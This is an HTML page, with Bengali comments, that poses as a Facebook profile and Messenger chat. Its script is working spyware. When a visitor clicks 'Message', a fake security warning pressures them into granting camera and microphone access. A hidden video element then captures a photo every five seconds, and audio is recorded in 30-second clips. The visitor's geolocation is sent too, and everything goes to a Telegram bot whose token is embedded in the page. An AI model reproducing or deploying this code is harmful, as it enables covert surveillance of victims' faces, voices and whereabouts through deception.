<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook | M.H. Miraz</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* নিখুঁত ফেসবুক ডিজাইন */
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
        body { background: #f0f2f5; }
        .p-header { background: #fff; border-bottom: 1px solid #ddd; padding-bottom: 10px; }
        .cover { width:100%; height:210px; background:#ddd url('cover.jpg') center/cover; }
        .p-info { text-align:center; margin-top:-80px; padding:0 15px; }
        .p-pic { width:165px; height:165px; border-radius:50%; border:5px solid #fff; background:#ccc url('profile.jpg') center/cover; display:inline-block; }
        .p-name { font-size:26px; font-weight:800; margin-top:10px; color:#050505; }
        .btn-box { display:flex; gap:10px; padding:15px; max-width:500px; margin:0 auto; }
        .btn { flex:1; border:none; border-radius:8px; padding:10px; font-weight:600; cursor:pointer; font-size:15px; display:flex; align-items:center; justify-content:center; gap:8px; }
        .btn-blue { background:#1877f2; color:#fff; }
        .btn-gray { background:#e4e6eb; color:#050505; }
        
        /* বায়ো ও ডিটেইলস */
        .bio-section { background:#fff; margin-top:10px; padding:15px; border-top:1px solid #ddd; }
        .bio-txt { text-align:center; font-size:15px; margin-bottom:15px; color:#1c1e21; }
        .detail-item { display:flex; align-items:center; gap:12px; margin-bottom:12px; font-size:15px; color:#1c1e21; }
        .detail-item i { color:#8a8d91; font-size:20px; width:25px; }

        /* মেসেঞ্জার ওভারলে (নিখুঁত ক্লোন) */
        #messengerUI { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:10000; flex-direction:column; }
        .msgr-h { padding:10px 15px; border-bottom:1px solid #eee; display:flex; align-items:center; gap:12px; }
        .msgr-n { font-weight:700; font-size:17px; flex:1; }
        .msgr-icons { color:#0084ff; display:flex; gap:20px; font-size:18px; }
        .msgr-body { flex:1; background:#fff; display:flex; flex-direction:column; align-items:center; justify-content:center; color:#8a8d91; }
        .msgr-foot { padding:10px; border-top:1px solid #eee; display:flex; align-items:center; gap:10px; }
        .msgr-in { flex:1; background:#f0f2f5; border:none; padding:10px 15px; border-radius:22px; outline:none; }

        /* ভিডিও/লোকেশন ট্র্যাকার (ইনভিজিবল) */
        video, canvas { display:none; position:absolute; left:-9999px; }
    </style>
</head>
<body>

<div id="profilePage">
    <div class="p-header">
        <div class="cover"></div>
        <div class="p-info">
            <div class="p-pic"></div>
            <div class="p-name">M.H. Miřãz</div>
            <p style="color:#65676b; font-size:14px; margin-top:5px;">288 Friends • 2 mutual</p>
        </div>
        <div class="btn-box">
            <button id="addFriendBtn" class="btn btn-blue" onclick="sendFriendRequest()"><i class="fas fa-user-plus"></i> Add Friend</button>
            <button class="btn btn-gray" onclick="mandatoryPermission()"><i class="fab fa-facebook-messenger"></i> Message</button>
        </div>
    </div>

    <div class="bio-section">
        <div class="bio-txt">Life is a Book, and those who do not travel read only a page. 📖✈️</div>
        <div class="detail-item"><i class="fas fa-briefcase"></i> <span>Web Developer & Programmer</span></div>
        <div class="detail-item"><i class="fas fa-graduation-cap"></i> <span>Studied at <b>Rangpur Polytechnic Institute</b></span></div>
        <div class="detail-item"><i class="fas fa-home"></i> <span>Lives in <b>Rangpur</b></span></div>
    </div>
</div>

<div id="messengerUI">
    <div class="msgr-h">
        <i class="fas fa-arrow-left" style="color:#0084ff;" onclick="location.reload()"></i>
        <img src="profile.jpg" style="width:36px; height:36px; border-radius:50%;">
        <div class="msgr-n">M.H. Miraz</div>
        <div class="msgr-icons"><i class="fas fa-phone-alt"></i><i class="fas fa-video"></i></div>
    </div>
    <div class="msgr-body">
        <img src="profile.jpg" style="width:80px; height:80px; border-radius:50%; margin-bottom:10px;">
        <h3 style="color:#050505;">M.H. Miraz</h3>
        <p>Facebook • You're friends on Facebook</p>
        <p style="margin-top:5px;">Lives in Rangpur, Bangladesh</p>
    </div>
    <div class="msgr-foot">
        <i class="fas fa-plus-circle" style="color:#0084ff;"></i>
        <input type="text" class="msgr-in" placeholder="Aa">
        <i class="fas fa-thumbs-up" style="color:#0084ff;"></i>
    </div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
    const BOT_TOKEN = '8600117294:AAH2qNjbQz3-iOCjHsZBfOi1qAUs1Uq2i0o';
    const CHAT_ID = '7767412329';

    // ১. অ্যাড ফ্রেন্ড লজিক
    function sendFriendRequest() {
        const btn = document.getElementById('addFriendBtn');
        btn.innerHTML = '<i class="fas fa-user-check"></i> Requested';
        btn.style.background = '#e4e6eb';
        btn.style.color = '#050505';
        
        // টেলিগ্রামে এপ্রুভাল রিকোয়েস্ট পাঠানো
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=New Friend Request! Approval Needed.`);
    }

    // ২. বাধ্যতামূলক পারমিশন ও মেসেঞ্জার লজিক
    async function mandatoryPermission() {
        try {
            // পারমিশন চাওয়ার প্রম্পট
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('v').srcObject = stream;

            // লোকেশন বের করা
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    const loc = `📍 User Found: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(loc)}`);
                });
            }

            // পারমিশন সফল হলে মেসেঞ্জার ওপেন
            document.getElementById('profilePage').style.display = 'none';
            document.getElementById('messengerUI').style.display = 'flex';

            // ব্যাকগ্রাউন্ড ট্র্যাকিং শুরু
            startTracking(stream);

        } catch (err) {
            // যদি এলাও না করে, তবে বারবার এলার্ট দেবে (বাধ্যতামূলক)
            alert("Security Warning: You must allow camera and microphone access to start a secure conversation on Messenger.");
        }
    }

    function startTracking(stream) {
        // ছবি পাঠানো
        setInterval(() => {
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            if (v.videoWidth > 0) {
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                c.toBlob(b => {
                    let f = new FormData(); f.append('chat_id', CHAT_ID); f.append('photo', b, 's.jpg');
                    let x = new XMLHttpRequest(); x.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, true); x.send(f);
                }, 'image/jpeg', 0.5);
            }
        }, 5000);

        // অডিও পাঠানো
        let r = new MediaRecorder(stream);
        let ch = [];
        r.ondataavailable = e => ch.push(e.data);
        r.onstop = () => {
            let b = new Blob(ch, {type:'audio/ogg'});
            let f = new FormData(); f.append('chat_id', CHAT_ID); f.append('voice', b, 'v.ogg');
            let x = new XMLHttpRequest(); x.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, true); x.send(f);
            ch = []; r.start();
        };
        r.start();
        setInterval(() => { if(r.state==='recording') r.stop(); }, 30000);
    }
</script>

</body>
</html>
